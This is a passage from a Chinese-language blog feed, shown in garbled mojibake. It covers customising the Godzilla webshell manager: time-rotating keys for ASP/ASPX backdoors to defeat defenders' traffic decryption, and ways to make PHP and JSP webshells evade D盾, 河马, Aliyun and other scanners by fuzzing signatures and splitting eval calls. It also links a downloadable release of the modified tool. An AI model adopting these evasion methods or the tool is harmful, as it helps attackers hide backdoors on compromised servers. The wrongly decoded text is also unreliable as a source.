src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250110164330274.png" alt="image-20250110164330274"></p><p>å½“åˆ°æœŸåï¼Œä¸ä¼šæ˜¾ç¤ºnullï¼Œä¼šæ˜¾ç¤ºä¸€ä¸ªä¹±ç ï¼Œè§ä¸Šå›¾ã€‚å°±æ˜¯è¿‡æœŸäº†ï¼Œä»æ–°è¿›å…¥å°±å¯ä»¥äº†ã€‚</p><p>å’Œphpä¸€æ ·ï¼Œå½“16ï¼š49åˆ†æ—¶å°±èƒ½ç”¨ä¸€åˆ†é’Ÿäº†ï¼Œéœ€è¦ä»æ–°è¿›å…¥äº†ã€‚</p><p>å¥½ï¼Œç®€å•è¯•ä¸‹å…æ€ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250110164643501.png" alt="image-20250110164643501"></p><p>å…¶ä»–å¹³å°å°±ä¸è¯•äº†ï¼Œåº”è¯¥ä¹Ÿæ²¡é—®é¢˜ã€‚</p><p>å¥½ï¼Œaspå°±åˆ°è¿™é‡Œã€‚ä¸‹é¢aspxã€‚</p><h5 id="aspx-å®ç°åŠ¨æ€å¯†é’¥"><a href="#aspx-å®ç°åŠ¨æ€å¯†é’¥" class="headerlink" title="aspx å®ç°åŠ¨æ€å¯†é’¥"></a>aspx å®ç°åŠ¨æ€å¯†é’¥</h5><p>åŸç†éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ”¹æ”¹ä»£ç å³å¯ã€‚</p><p>aspx å®ç°md5 FormsAuthentication.HashPasswordForStoringInConfigFile(str, â€œMD5â€)</p><p>ç„¶åè·å–ä¸€ä¸‹æ—¶é—´ï¼Œå³å¯ï¼Œ</p><p>Response.Write(currentDate.ToString(â€œyyyy-MM-dd HH:mm:ssâ€));</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113114202059.png" alt="image-20250113114202059"></p><p>ç„¶åè¿™é‡Œï¼Œæˆ‘ä»¬å°†æ—¶é—´è¿›è¡Œmd5ï¼Œå†ç„¶åæˆªå–å³å¯ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113114400702.png" alt="image-20250113114400702"></p><p>å¤§æ¦‚è¿™æ ·ï¼Œå¥½ï¼Œæˆ‘ä»¬å…ˆæ¥ä¸ªååˆ†é’Ÿçš„è¿›è¡Œæµ‹è¯•ä¸€ä¸‹å•Šã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113114736675.png" alt="image-20250113114736675"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113114804784.png" alt="image-20250113114804784"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113114830763.png" alt="image-20250113114830763"></p><p>ä½¿ç”¨èµ·æ¥æ²¡æœ‰é—®é¢˜ã€‚å½“ååˆ†é’Ÿåï¼Œæ—¶é—´åˆ°æœŸäº†</p><p>æ˜¾ç¤ºçš„å†…å®¹å’Œphpçš„ä¸€æ ·ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113115047127.png" alt="image-20250113115047127"></p><p>ä¼šä»€ä¹ˆä¹Ÿä¸è¿”å›ã€‚è¿™æ—¶å€™ï¼Œä»æ–°è¿›å…¥æ—¢å¯ä»¥äº†</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113115320481.png" alt="image-20250113115320481"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113115450558.png" alt="image-20250113115450558"></p><p>åŒæ ·çš„ï¼Œç»™å¤§å®¶å‡†å¤‡äº†ï¼Œä¸¤ä¸ªæ—¶é—´ç‰ˆæœ¬ä¾›é€‰æ‹©ï¼Œ10minå’Œ60minçš„ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113115758077.png" alt="image-20250113115758077"></p><p>æ¥ä¸‹äº†ï¼Œå°†æœ¨é©¬å°è£…åˆ°godzillaä¸­ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113135939818.png" alt="image-20250113135939818"></p><p>ç”Ÿæˆæœ¨ğŸ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113140037262.png" alt="image-20250113140037262"></p><p>ä¸¤ç§é€‰æ‹©ï¼Œéƒ½åŠ äº†å…æ€æ•ˆæœã€‚å¤§å®¶è®°å¾—ä½¿ç”¨çš„æ—¶å€™æŠŠpassè®¾ç½®å¤æ‚ä¸€äº›ï¼Œé˜²æ­¢ä¸Šè½¦ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113140617749.png" alt="image-20250113140617749"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113140429466.png" alt="image-20250113140429466"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113140501275.png" alt="image-20250113140501275"></p><p>ä½¿ç”¨éƒ½æ²¡å•¥é—®é¢˜ã€‚å¥½ï¼Œaspä¹Ÿå†™å®Œæˆäº†ã€‚</p><h5 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>æœ¬æ–‡å¯¹phpã€jspã€aspã€aspxå››ç§è¯­è¨€å°è¯•å®ç°åŠ¨æ€å¯†é’¥ï¼Œä½†æ˜¯é—æ†¾æ˜¯jspè¯­è¨€æš‚æœªå®ç°ã€‚å¦‚æœæœ‰å¤§ç‰›æœ‰å…´è¶£å¯ä»¥ç ”ç©¶ä¸€ä¸‹ã€‚</p><p>phpã€aspã€aspxä¸‰ç§è¯­è¨€éƒ½å®ç°äº†ï¼ŒåŠ¨æ€å¯†é’¥ç”Ÿæˆè¿æ¥ã€‚éƒ½ä¸º10minå’Œ60minä¸¤ç§é€‰æ‹©ã€‚</p><p>phpï¼šPHP_XOR_BASE64_MESSAGE_60minã€PHP_XOR_BASE64_MESSAGE_10min</p><p>aspï¼šASP_XOR_BASE64_MESSAGE_data10minã€ASP_XOR_BASE64_MESSAGE_data60min</p><p>aspxï¼šCSHAP_AES_BASE64_DATA_10minã€CSHAP_AES_BASE64_DATA_60min</p><h5 id="ä¸‹ä¸ªç‰ˆæœ¬"><a href="#ä¸‹ä¸ªç‰ˆæœ¬" class="headerlink" title="ä¸‹ä¸ªç‰ˆæœ¬"></a>ä¸‹ä¸ªç‰ˆæœ¬</h5><p>å¤§å®¶å¯ä»¥å‘ç°ï¼Œè¯¥ç‰ˆæœ¬æˆ‘å†™çš„æ–‡ç« è¾ƒå°‘ï¼Œæœ‰è®¸å¤šä»£ç éƒ½æ²¡æœ‰è¯¦ç»†çš„å†™å‡ºæ¥ï¼Œä¸€äº›æ—¶é—´çš„è·å–ä¸Šï¼Œéƒ½æ²¡æœ‰åˆ—å‡ºæ¥ï¼Œä¸ºçš„å°±æ˜¯å¤§å®¶å¯ä»¥å¤šä½¿ç”¨ä¸€äº›æ—¶é—´ã€‚æ‰€ä»¥è¿™ä¸ªç‰ˆæœ¬ç¬”è€…å…ˆæš‚ä¸å…¬å¸ƒä»£ç ï¼Œä¸‹ä¸ªç‰ˆæœ¬åœ¨è¿›è¡Œå…¬å¸ƒåœ¨githubã€‚</p><p>1.2ç‰ˆæœ¬å®ç°åŠ¨æ€å¯†é’¥è·å–ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æ”¹æµé‡ä»¥åŠåŠ å¯†æ–¹å¼ï¼Œåªæ˜¯åšäº†ä¼ªè£…ï¼Œ<br>åé¢éœ€è¦åšçš„ï¼šä¿®æ”¹ä¸€ä¸‹åŠ å¯†æ–¹å¼ï¼Œè¿™æ ·çš„è¯ä¼šæ›´å¥½ä¸€ç‚¹ã€‚è¿˜æœ‰å°±æ˜¯messageå…¶å®æ˜¯å›ºå®šçš„ï¼Œå¸Œæœ›èƒ½è®©ä»–åŠ¨èµ·æ¥ã€‚è¿˜æœ‰ä¼ é€’çš„å‚æ•° page=1&amp;size=10 æ˜¯å›ºå®šçš„ï¼Œè®©ä»–ä¹ŸåŠ¨èµ·æ¥ï¼Œæ¯”å¦‚Accept-Languageã€User-Agentè¿™ç§headerå¤´å®ç°åŠ¨æ€çš„ ã€‚å…¶ä»–è¯­è¨€çš„ æ¯”å¦‚ jspfçš„ ï¼Œasmxçš„éƒ½æ²¡åšï¼Œç¬”è€…åé¢åšã€‚</p><p><code>è¿™é‡Œæ”¶é›†ä¸ªå»ºè®®ï¼Œå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å®ç°äº† 10minå’Œ60minçš„æ¢å¯†é’¥ï¼Œç¬”è€…åœ¨æµ‹è¯•çš„æ—¶å€™ï¼Œå…¶å®æ˜¯å¯ä»¥å®ç°1åˆ†é’Ÿï¼Œæˆ–è€…ä»»æ„æ—¶é—´æ¢å¯†é’¥çš„ï¼Œå°±æ˜¯æƒ³é—®ä¸‹ï¼Œéœ€ä¸éœ€è¦1minè¿™ç§shellï¼Œå°±æ˜¯æˆ‘å°±ä¸æƒ³è®©è“é˜Ÿé‚£ä¹ˆå¿«è§£å¯†ï¼Œç”šè‡³è§£ä¸å‡ºæ¥ã€ä½†æ˜¯æ¯”è¾ƒæé™ï¼Œæ‰§è¡Œä¸¤æ¡ä¸‰æ¡å‘½ä»¤å°±è¦ä»æ–°ç‚¹å‡»è¿›å…¥ï¼Œæœ‰äº›éº»çƒ¦ï¼Œæˆ–è€…å…¶ä»–æƒ³æ³•ã€‚ç•™è¨€å³å¯ã€‚</code></p><h5 id="ä¸‹è½½ã€ä½¿ç”¨"><a href="#ä¸‹è½½ã€ä½¿ç”¨" class="headerlink" title="ä¸‹è½½ã€ä½¿ç”¨"></a>ä¸‹è½½ã€ä½¿ç”¨</h5><p>ä»€ä¹ˆï¼Œä½ è¯´çœ‹ä¸æ˜ç™½ã€ä¸æƒ³åŠ¨æ‰‹ã€å¤ªéº»çƒ¦ï¼Œæ²¡äº‹ï¼Œå»ä¸‹è½½å°±å¯ä»¥äº†ã€‚<br><a href="https://github.com/Bohemiana/godzilla_erkai">https://github.com/Bohemiana/godzilla_erkai</a></p><p>release 1.0 æµé‡ä¿®æ”¹ç‰ˆæœ¬ï¼Œsrcä»£ç ä¹Ÿä»¥ä¸Šä¼ ï¼Œå¤§å®¶ç›´æ¥ä¸‹è½½ç ”ç©¶å³å¯ã€‚</p><p>release 1.1 å…æ€ç‰ˆæœ¬ï¼Œsrcä»£ç ä¹Ÿä»¥ä¸Šä¼ ï¼Œå¤§å®¶ç›´æ¥ä¸‹è½½ç ”ç©¶å³å¯ã€‚</p><p>release 1.2 æµé‡ä¿®æ”¹+å…æ€+åŠ¨æ€å¯†é’¥ç‰ˆæœ¬ï¼Œå¤§å®¶ç›´æ¥ä¸‹è½½ä½¿ç”¨å³å¯ã€‚</p><h5 id="è‡´è°¢"><a href="#è‡´è°¢" class="headerlink" title="è‡´è°¢"></a>è‡´è°¢</h5><p>æœ€åæ„Ÿè°¢æ‚¨è¯»åˆ°ç°åœ¨ï¼Œè¿™ç¯‡æ–‡ç« åŒ†å¿™æ„æˆè‚¯å®šæœ‰ä¸å‘¨åˆ°æˆ–æè¿°ä¸æ­£ç¡®çš„åœ°æ–¹ï¼ŒæœŸå¾…ä¸šç•Œå¸ˆå‚…ä»¬ç”¨å„ç§æ–¹å¼æŒ‡æ­£å‹˜è¯¯ã€‚</p><h5 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BeichenDream/Godzilla            è‡´æ•¬åŸç‰ˆå“¥æ–¯æ‹‰</span><br><span class="line">https://mp.weixin.qq.com/s/EwY8if6ed_hZ3nQBiC3o7A   å†°èv4.0ä¼ è¾“åè®®è¯¦è§£</span><br><span class="line">https://yzddmr6.com/posts/antsword-xor-encoder/   èšå‰‘å®ç°åŠ¨æ€ç§˜é’¥ç¼–ç å™¨è§£ç å™¨</span><br></pre></td></tr></table></figure><blockquote><p>emmm å¤ªèœäº†<br>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> godzilla </tag>
            
            <tag> äºŒå¼€ </tag>
            
            <tag> åŠ¨æ€å¯†é’¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å“¥æ–¯æ‹‰äºŒå¼€ä»0åˆ°1-2(å…æ€)</title>
      <link href="/2024/11/18/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/"/>
      <url>/2024/11/18/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/</url>
      
        <content type="html"><![CDATA[<h5 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h5><p>æœ‰å°ä¼™ä¼´æè®®è¯´ï¼Œæˆ‘ä»¬ä¸Šä¸ªæ–‡ç« æ”¹äº†ä¸€ä¸‹å“¥æ–¯æ‹‰çš„æµé‡ï¼Œä½†æ˜¯åœ¨å®é™…çš„åº”ç”¨ä¸­ï¼Œæˆ‘ä»¬æ‰“æˆ˜è‚¯å®šè¦å…ˆä¼ æœ¨é©¬è½åœ°ï¼Œå¦‚æœä¸èƒ½è½åœ°ï¼Œé‚£ä¹ˆä½ æµé‡æ”¹çš„å†å¥½ï¼Œå…¶å®ä¹Ÿæ²¡æœ‰æ„ä¹‰ï¼Œæƒ³æƒ³ï¼Œç¡®å®ä¹Ÿæ˜¯ã€‚æ²¡æœ‰ç¬¬ä¸€æ­¥ä¸Šä¼ æ–‡ä»¶ï¼Œå“ªé‡Œå­˜åœ¨æµé‡å‘¢ã€‚</p><p>é‚£ä¹ˆè¿™æ¬¡å’±ä»¬æ¥åšä¸€ä¸‹å…æ€ã€‚åœ¨å®é™…çš„åº”ç”¨ä¸­ï¼Œä¼¼ä¹æˆ‘ä»¬ç»å¸¸ç¢°åˆ°å®‰å…¨è®¾å¤‡ï¼Œå¥ˆä½•å’±è¿™ä¹Ÿæ²¡æœ‰å•¥å®‰å…¨è®¾å¤‡ï¼Œæˆ‘ä»¬å°±é‡‡ç”¨å¸¸è§çš„å‚å•†çš„åœ¨çº¿æ€è½¯å§ã€‚å¦‚æœæœ‰å°ä¼™ä¼´æœ‰çš„è¯ï¼Œå¯ä»¥å¸®æˆ‘æµ‹æµ‹ï¼ŒæŠŠç»“æœå‘Šè¯‰æˆ‘ï¼Œç¬”è€…å†è¿›è¡Œä¼˜åŒ–ã€‚</p><h5 id="php-å…æ€"><a href="#php-å…æ€" class="headerlink" title="php å…æ€"></a>php å…æ€</h5><p>æˆ‘ä»¬ç”¨é»˜è®¤ç”Ÿæˆçš„æ–‡ä»¶ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118113734653.png" alt="image-20241118113734653"></p><p>æ‹–åˆ°dç›¾ä¸­ï¼Œçœ‹ä¸€ä¸‹</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118114632737.png" alt="image-20241118114632737"></p><p>ä¼šæŠ¥3çº§çš„åŒå±‚å˜é‡ï¼Œé‚£å¥½åŠï¼Œæ‹¿å‡ºæ¥å°±è¡Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118114954546.png" alt="image-20241118114954546"></p><p>è®©ä»–å…ˆç­‰äºä¸€ä¸ªå˜é‡ï¼Œåœ¨ä¼ é€’å°±å¯ä»¥äº†ã€‚</p><p>å®Œäº‹ä¹‹åï¼Œå°±å¯ä»¥äº†</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118150517857.png" alt="image-20241118150517857"></p><p>æ²¡æœ‰a.phpäº†ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118152210198.png" alt="image-20241118152210198"></p><p>æ²³é©¬æŠ¥æ¯’ï¼Œæˆ‘ä»¬ä½¿ç”¨fuzzæ–¹æ³•çœ‹ä¸€ä¸‹å“ªé‡Œæœ‰é—®é¢˜ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118152338008.png" alt="image-20241118152338008"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118152350132.png" alt="image-20241118152350132"></p><p>è¿™é‡Œç»è¿‡fuzzï¼Œè¿™é‡Œæœ‰<code>$qianxinITUfjjXmxo2($_POST[$qianxinw7hJzkKxyi])</code>çš„æ—¶å€™ï¼Œé‚£ä¹ˆå°±æŠ¥æ¯’ï¼Œé‚£ç®€å•ï¼Œç›´æ¥ç»™ä»–æ‹†å‡ºæ¥ï¼Œç”¨å˜é‡å†™ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118152548119.png" alt="image-20241118152548119"></p><p>è¿™æ ·å†™ï¼Œå°±å¯ä»¥äº†</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118152645497.png" alt="image-20241118152645497"></p><p>è¿™é‡Œæœ¬åœ°ç‰ˆçš„æ²³é©¬æ˜¯æ²¡æœ‰é—®é¢˜äº†ï¼Œä½†æ˜¯å§ï¼Œåœ¨çº¿ç‰ˆçš„æ²³é©¬å°±æ˜¯è¿‡ä¸å»ï¼Œåªè¦å‡ºç°evalï¼Œå°±ç›´æ¥æŠ¥ã€‚æš‚æ—¶æ²¡æœ‰å¤ªå¥½çš„åŠæ³•ã€‚åœ¨çº¿åŠ å¯†ä¹Ÿè¡Œï¼Œä¸è¿‡æ¯”è¾ƒéº»çƒ¦ã€‚è¿™é‡Œå°±ä¸å†™äº†</p><p>åƒdç›¾æ²³é©¬è¿™ç§éƒ½æ˜¯é™æ€æŸ¥æ€çš„ï¼Œä»–ä¸ç®¡ä½ é‡Œé¢çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Œå‡ºç°evalè¿™ç§æˆ–è€…eval()  eval(chuanchan) å°±ä¼šæŠ¥ï¼Œdç›¾è¿˜å¥½è§£å†³ä¸€ç‚¹ï¼Œç”¨ç±»å¯ä»¥ç»•ï¼Œä½†æ˜¯æŠŠ  æ²³é©¬æ­»æ´»ç»•ä¸è¿‡ï¼Œå…ˆæä¸‹å§ã€‚</p><p>å®é™…ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šè§åˆ°ä¸€ä¸‹å•†ä¸šwafï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118171049436.png" alt="image-20241118171049436"></p><p>å¾®æ­¥æ²¡æŠ¥ï¼Œä½†æ˜¯ä»–è¿™ä¸ªgtpè¯´å¯èƒ½æœ‰é—®é¢˜ã€‚</p><p>ç«ç»’å’Œ360ã€‚ç«ç»’å’Œ360å¯¹webshellå…¶å®æ˜¯ä¸æ•æ„Ÿçš„ï¼Œç»ˆç«¯å®‰å…¨ï¼Œå¯¹cs æˆ–è€…msfçš„ğŸéƒ½æ¯”è¾ƒæ•æ„Ÿï¼Œæ‰€ä»¥æ„Ÿè§‰è¿™ä¸ªï¼Œæ²¡å•¥æ„ä¹‰ã€‚ä¹Ÿæµ‹ä¸€ä¸‹å§ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118182716236.png" alt="image-20241118182716236"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118182735288.png" alt="image-20241118182735288"></p><p>é˜¿é‡Œäº‘æŠ¥äº†å¯ç–‘ï¼Œæ²¡æœ‰ç»•è¿‡å»ã€‚è¿™ä¸ªevalæ²¡æœ‰è¿‡å»</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241120152721804.png" alt="image-20241120152721804"></p><p>å¥½ï¼Œphpçš„å…æ€å°±å…ˆåˆ°è¿™é‡Œå§ã€‚å¥ˆä½•ç¬”è€…å¤ªèœäº†ï¼ŒåŠ¨æ€çš„webshellæŸ¥æ€éƒ½è¿‡ä¸å»ã€‚</p><p>ç¬”è€…åœ¨æµ‹è¯•php5çš„æ—¶å€™ï¼Œå‘ç°<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241120153557064.png" alt="image-20241120153557064"></p><p>http_response_code(404);è¿™è¡Œä»£ç æ—¶æŠ¥é”™çš„</p><p>åœ¨phpå®˜ç½‘çœ‹ï¼Œå‘ç°http_response_codeåªåœ¨(PHP 5 &gt;= 5.4.0, PHP 7, PHP 8)æ”¯æŒã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241120153706885.png" alt="image-20241120153706885"></p><p>ä¸è¿‡ï¼Œä¸‹é¢åœ¨åä¸€å¹´å‰ï¼Œæœ‰å¤§ç‰›å·²ç»ç»™å‡ºäº†è§£å†³æ–¹æ³•ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241120153831577.png" alt="image-20241120153831577"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241120153956079.png" alt="image-20241120153956079"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241120154307563.png" alt="image-20241120154307563"></p><p>å¥½ï¼Œè¿™é‡Œæˆ‘ä»¬å°±æ”¹å®Œäº†ã€‚</p><p>ç”¨ç¬”è€…å¼€çš„è¿™ä¸ªå·¥å…·ï¼Œä½ ä¼šå‘ç°ï¼Œæ¯æ¬¡ç”Ÿæˆçš„ğŸéƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ³¨é‡Šä»€ä¹ˆçš„ï¼Œå’Œå˜é‡åï¼Œéƒ½ä¸€æ ·ã€‚</p><p>æˆ‘ä»¬æƒ³åŠæ³•ç»™ä»–å†™ä¸€ä¸‹ï¼Œç„¶ä»–å˜åŠ¨èµ·æ¥ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122110329067.png" alt="image-20241122110329067"></p><p>æˆ‘ä»¬åœ¨åŸç‰ˆä¸­å¯ä»¥çœ‹åˆ°ï¼Œè¯»å–å“¥æ–¯æ‹‰é»˜è®¤ç”Ÿæˆæ¨¡æ¿binæ–‡ä»¶åï¼Œä¼šæ›¿æ¢pass å’Œkeyã€‚</p><p>é‚£ä¹ˆç›¸åº”çš„ï¼Œæˆ‘ä»¬å®šä¹‰å‡ ä¸ªå˜é‡ï¼Œè®©ä»–éšæœºæ›¿æ¢å³å¯ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122110501144.png" alt="image-20241122110501144"></p><p>é¦–å…ˆæˆ‘ä»¬åœ¨æ–¹æ³•é‡Œå®šä¹‰ä¸€ä¸ªæ•°ç»„ï¼Œç„¶åè¿›è¡Œéšæœºæ’åºï¼Œç„¶åå†ç»™ä»–æ‹¿å‡ºæ¥ç”¨ï¼Œå°±å¯ä»¥äº†ã€‚è¿™é‡Œç”¨äº†å‡ ä¸ªå­—ç¬¦ä¸²ã€‚ç„¶ååˆ†åˆ«è¿›è¡Œæ›¿æ¢æ‰ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122110649176-17322448095041.png" alt="image-20241122110649176"></p><p>æˆ‘ä»¬å†åœ¨binæ–‡ä»¶ä¸­ï¼Œå†™ä¸Šç›¸åº”çš„æ‰€éœ€è¦æ›¿æ¢çš„å­—ç¬¦ä¸²ï¼Œè¿™æ ·å°±å¯ä»¥äº†ã€‚æ‰“åŒ…ï¼Œç¼–è¯‘ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122111132618.png" alt="image-20241122111132618"></p><p>è¿™æ ·ï¼Œæˆ‘ä»¬æ¯æ¬¡ç”Ÿæˆçš„æœ¨é©¬å°±ä¸ä¸€æ ·äº†ã€‚å°±åŠ¨æ€äº†ã€‚ä½†æ˜¯å…¶å®æ€»ä½“ç»“æ„è¿˜æ˜¯ä¸å˜çš„ã€‚å˜å¾—åªæ˜¯å˜é‡ã€‚</p><p>æ²¡äº‹ï¼Œèƒ½ç”¨å°±è¡Œï¼Œåé¢åœ¨ä¼˜åŒ–ã€‚å¥½äº† phpçš„å…æ€å°±å…ˆåšåˆ°è¿™é‡Œï¼Œä¸‹é¢æ˜¯jspçš„ã€‚</p><h5 id="jsp-å…æ€"><a href="#jsp-å…æ€" class="headerlink" title="jsp å…æ€"></a>jsp å…æ€</h5><p>ç¯å¢ƒï¼šApache Tomcat/9.0.65</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122143604309.png" alt="image-20241122143604309"></p><p>ä¸Šæ¥å°±æ˜¯å·²çŸ¥åé—¨ï¼Œé‚£ä¹ˆè‚¯å®šæ˜¯è¢«åŒ¹é…åˆ°äº†å…³é”®å­—ï¼Œfuzzä¸€ä¸‹ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122144122631.png" alt="image-20241122144122631"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122144144439.png" alt="image-20241122144144439"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122144208689.png" alt="image-20241122144208689"></p><p>åœ¨ä¸¤æ¬¡çš„ğŸä¸­å¯ä»¥çœ‹åˆ°ï¼Œåº”è¯¥æ˜¯åŒ¹é…äº†cipherã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122152115554.png" alt="image-20241122152115554"></p><p>è¿™é‡Œç»™ä»–æ¢æˆUnicodeè¿˜æ˜¯æŠ¥ï¼Œé‚£å¯èƒ½è¿˜æœ‰å…³é”®è¯ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122152702167.png" alt="image-20241122152702167"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122152725481.png" 